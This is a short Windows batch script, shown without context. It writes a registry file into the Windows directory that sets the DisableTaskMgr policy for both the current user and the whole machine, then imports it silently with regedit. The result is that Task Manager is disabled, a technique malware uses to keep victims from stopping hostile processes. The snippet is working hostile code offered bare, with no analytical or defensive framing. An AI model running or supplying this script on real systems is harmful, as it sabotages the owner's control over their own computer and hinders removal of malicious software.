ECHO REGEDIT4 > %WINDIR%\DXM.REG
echo. >> %WINDIR%\DXM.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:1>> %WINDIR%\DXM.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:1 >> %WINDIR%\DXM.reg
start /w regedit /s %WINDIR%\DXM.reg